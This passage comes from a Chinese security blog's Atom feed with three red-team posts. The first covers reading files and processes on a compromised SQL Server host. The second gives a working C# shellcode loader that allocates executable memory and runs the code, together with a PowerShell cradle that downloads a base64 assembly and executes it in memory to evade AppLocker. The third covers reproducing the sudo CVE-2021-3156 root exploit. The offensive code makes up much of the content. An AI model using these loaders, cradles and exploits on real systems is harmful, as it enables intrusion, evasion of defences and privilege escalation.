alt=""></p><p>然后遇见的几个坑<br>1.type读文件不行<br>2.sql server的表存储内容大小有限，超过会被截断</p><p>解决方法统一用powershell来代替<br>读取进程</p><pre><code>powershell &quot;tasklist /svc | Select -First 35&quot; #读取到35行powershell &quot;$data=tasklist /svc;$data[36..60]&quot; #从36行读到60行</code></pre><p>用上面的第二条命令逐行读取直到读完全部<br><img src="https://s3.ax1x.com/2021/02/13/ysJmsf.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/02/13/ysJQoQ.png" alt=""></p><p>powershell代替type命令读取文件</p><pre><code>powershell &quot;get-content C:\Windows\System32\drivers\etc\hosts&quot;powershell &quot;get-content C:\Windows\System32\drivers\etc\hosts | Select -First 10&quot;</code></pre><p><img src="https://s3.ax1x.com/2021/02/13/ysJIfA.png" alt=""></p><p>尝试上线提权发现，shell连几秒后马上断开。最后确定是IDS的问题，现在卡在这个地方…</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;观前提醒&quot;&gt;&lt;a href=&quot;#观前提醒&quot; class=&quot;headerlink&quot; title=&quot;观前提醒&quot;&gt;&lt;/a&gt;观前提醒&lt;/h2&gt;&lt;p&gt;本文已对实际的人以游戏或番剧人名代替&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;header</summary>
      
    
    
    
    
    <category term="渗透" scheme="http://422926799.github.io/tags/渗透/"/>
    
  </entry>
  
  <entry>
    <title>powershell Assembly Load的使用</title>
    <link href="http://422926799.github.io/posts/7318adbf.html"/>
    <id>http://422926799.github.io/posts/7318adbf.html</id>
    <published>2021-01-31T19:19:38.000Z</published>
    <updated>2021-01-31T19:35:28.044Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>分析昨天的vbs的时候看见了个为<code>[Reflection.Assembly]::Load</code>的技术。好像没研究过<br>就拿来研究一下。</p><p>简要说明：利用powershell进行C#里的函数调用</p><p>参考链接：<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&amp;-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&amp;-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/</a></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>注意实现，被调用的类名和函数名。须为public。且为静态(static)<br>test.cs</p><pre><code class="c#">using System;using System.Runtime.InteropServices;namespace run{    public class Program    {        public static void box() {            byte[] shellcode = new byte[304]{                                    0x55, 0x8B, 0xEC, 0x83, 0xEC, 0x14, 0x53, 0x8D, 0x45, 0xEC, 0xC7, 0x45, 0xEC, 0x75, 0x73, 0x65,                                    0x72, 0x33, 0xDB, 0xC7, 0x45, 0xF0, 0x33, 0x32, 0x2E, 0x64, 0x50, 0xB9, 0x4C, 0x77, 0x26, 0x07,                                    0x66, 0xC7, 0x45, 0xF4, 0x6C, 0x6C, 0x88, 0x5D, 0xF6, 0xC7, 0x45, 0xF8, 0x74, 0x6F, 0x70, 0x73,                                    0x66, 0xC7, 0x45, 0xFC, 0x65, 0x63, 0x88, 0x5D, 0xFE, 0xE8, 0x1A, 0x00, 0x00, 0x00, 0xFF, 0xD0,                                    0x53, 0x8D, 0x45, 0xF8, 0xB9, 0x45, 0x83, 0x56, 0x07, 0x50, 0x50, 0x53, 0xE8, 0x07, 0x00, 0x00,                                    0x00, 0xFF, 0xD0, 0x5B, 0x8B, 0xE5, 0x5D, 0xC3, 0x83, 0xEC, 0x10, 0x64, 0xA1, 0x30, 0x00, 0x00,                                    0x00, 0x53, 0x55, 0x56, 0x8B, 0x40, 0x0C, 0x57, 0x89, 0x4C, 0x24, 0x18, 0x8B, 0x70, 0x0C, 0xE9,                                    0x8A, 0x00, 0x00, 0x00, 0x8B, 0x46, 0x30, 0x33, 0xC9, 0x8B, 0x5E, 0x2C, 0x8B, 0x36, 0x89, 0x44,                                    0x24, 0x14, 0x8B, 0x42, 0x3C, 0x8B, 0x6C, 0x10, 0x78, 0x89, 0x6C, 0x24, 0x10, 0x85, 0xED, 0x74,                                    0x6D, 0xC1, 0xEB, 0x10, 0x33, 0xFF, 0x85, 0xDB, 0x74, 0x1F, 0x8B, 0x6C, 0x24, 0x14, 0x8A, 0x04,                                    0x2F, 0xC1, 0xC9, 0x0D, 0x3C, 0x61, 0x0F, 0xBE, 0xC0, 0x7C, 0x03, 0x83, 0xC1, 0xE0, 0x03, 0xC8,                                    0x47, 0x3B, 0xFB, 0x72, 0xE9, 0x8B, 0x6C, 0x24, 0x10, 0x8B, 0x44, 0x2A, 0x20, 0x33, 0xDB, 0x8B,                                    0x7C, 0x2A, 0x18, 0x03, 0xC2, 0x89, 0x7C, 0x24, 0x14, 0x85, 0xFF, 0x74, 0x31, 0x8B, 0x28, 0x33,                                    0xFF, 0x03, 0xEA, 0x83, 0xC0, 0x04, 0x89, 0x44, 0x24, 0x1C, 0x0F, 0xBE, 0x45, 0x00, 0xC1, 0xCF,                                    0x0D, 0x03, 0xF8, 0x45, 0x80, 0x7D, 0xFF, 0x00, 0x75, 0xF0, 0x8D, 0x04, 0x0F, 0x3B, 0x44, 0x24,                                    0x18, 0x74, 0x20, 0x8B, 0x44, 0x24, 0x1C, 0x43, 0x3B, 0x5C, 0x24, 0x14, 0x72, 0xCF, 0x8B, 0x56,                                    0x18, 0x85, 0xD2, 0x0F, 0x85, 0x6B, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x5F, 0x5E, 0x5D, 0x5B, 0x83,                                    0xC4, 0x10, 0xC3, 0x8B, 0x74, 0x24, 0x10, 0x8B, 0x44, 0x16, 0x24, 0x8D, 0x04, 0x58, 0x0F, 0xB7,                                    0x0C, 0x10, 0x8B, 0x44, 0x16, 0x1C, 0x8D, 0x04, 0x88, 0x8B, 0x04, 0x10, 0x03, 0xC2, 0xEB, 0xDB                                };            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);            IntPtr hThread = IntPtr.Zero;            UInt32 threadId = 0;            // prepare data            IntPtr pinfo = IntPtr.Zero;            // execute native code            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);            WaitForSingleObject(hThread, 0xFFFFFFFF);        }        static void Main(string[] args)        {            // native function’s compiled code            // generated with metasploit        }        private static UInt32 MEM_COMMIT = 0x1000;        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);        [DllImport(&quot;kernel32&quot;)]        private static extern bool VirtualFree(IntPtr lpAddress,        UInt32 dwSize, UInt32 dwFreeType);        [DllImport(&quot;kernel32&quot;)]        private static extern IntPtr CreateThread(        UInt32 lpThreadAttributes,        UInt32 dwStackSize,        UInt32 lpStartAddress,        IntPtr param,        UInt32 dwCreationFlags,        ref UInt32 lpThreadId        );        [DllImport(&quot;kernel32&quot;)]        private static extern bool CloseHandle(IntPtr handle);        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 WaitForSingleObject(        IntPtr hHandle,        UInt32 dwMilliseconds        );        [DllImport(&quot;kernel32&quot;)]        private static extern IntPtr GetModuleHandle(        string moduleName        );        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 GetProcAddress(        IntPtr hModule,        string procName        );        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 LoadLibrary(        string lpFileName        );        [DllImport(&quot;kernel32&quot;)]        private static extern UInt32 GetLastError();    }}</code></pre><p>利用csc生成或者vs生成 (这里csc生成对应的位数须为x86)</p><pre><code>csc.exe /unsafe /platform:x86 /out:output\run.exe output\tmp.cs</code></pre><p>基本调用</p><pre><code class="powershell">$bytes = [System.IO.File]::ReadAllBytes(&quot;C:\Users\Jiushi\Desktop\test.exe&quot;)[Reflection.Assembly]::Load($bytes)[run.Program]::box()</code></pre><p><img src="https://s3.ax1x.com/2021/02/01/yVaJoT.png" alt=""></p><p>下载并执行<br>远端的payload.txt</p><pre><code>$bytes = [System.IO.File]::ReadAllBytes(&quot;C:\Users\Jiushi\Desktop\test.exe&quot;)$a=[Convert]::ToBase64String($bytes)$a | out-file &quot;payload.txt&quot;</code></pre><p>远程调用</p><pre><code>$payload=(New-Object Net.WebClient).DownloadString(&quot;URL&quot;)$tk=[Convert]::FromBase64String($payload)[Reflection.Assembly]::Load($tk)[run.Program]::box()</code></pre><p><img src="https://s3.ax1x.com/2021/02/01/yVa0yR.png" alt=""></p><p>写了个脚本用于快速生成对应的powershell command<br><a href="https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/AssemblyLoad%E7%94%9F%E6%88%90" target="_blank" rel="noopener">https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/AssemblyLoad%E7%94%9F%E6%88%90</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;分析昨天的vbs的时候看见了个为&lt;code&gt;[Reflection.Assembly]::Load&lt;/code&gt;的技术。好像没研究过&lt;br&gt;</summary>
      
    
    
    
    
    <category term="红队" scheme="http://422926799.github.io/tags/红队/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-3156 sudo提权漏洞复现</title>
    <link href="http://422926799.github.io/posts/14fbb503.html"/>
    <id>http://422926799.github.io/posts/14fbb503.html</id>
    <published>2021-01-31T09:51:17.000Z</published>
    <updated>2021-01-31T10:06:03.478Z</updated>
    
    <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Sudo 1.8.2 – 1.8.31p2<br>Sudo 1.9.0 – 1.9.5p1</p><p>sudo官方位于1月26号已经修复，后面在安装的sudo已经补上了<br><img src="https://s3.ax1x.com/2021/01/31/yErSN6.png" alt=""><br>官方链接：<a href="https://www.sudo.ws/" target="_blank" rel="noopener">https://www.sudo.ws/</a></p><p><strong>不影响的版本</strong><br>sudo =&gt;1.9.5p2</p><p>exp：<a href="https://github.com/422926799/note/tree/master/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2021-3156" target="_blank" rel="noopener">https://github.com/422926799/note/tree/master/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/CVE-2021-3156</a><br>来源于某微信公众号:<a href="https://mp.weixin.qq.com/s/c9UiJ74TbLXziK08tumIHA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/c9UiJ74TbLXziK08tumIHA</a></p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Debain Sudo version 1.8.31p1<br>Ubuntu Sudo version 1.8.21p2 （昨天安的sudo已经修复）</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>检测是否存在漏洞</p><pre><code>sudoedit -s /</code></pre><p>存在<br><img src="https://s3.ax1x.com/2021/01/31/yErYEq.png" alt=""></p><p>不存在<br><img src="https://s3.ax1x.com/2021/01/31/yErg56.png" alt=""></p><p>下载exp，make。然后运行sudo-hax-me-a-sandwich<br><img src="https://s3.ax1x.com/2021/01/31/yErhxe.png" alt=""></p><p><img src="https://s3.ax1x.com/2021/01/31/yErbIP.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Sudo 1.8.2 – 1.8.31p2&lt;br&gt;Sudo 1.9.0 – 1.9.5p1&lt;/p&gt;
&lt;p&gt;sudo官方位于1</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
    
  </entry>
  
</feed>
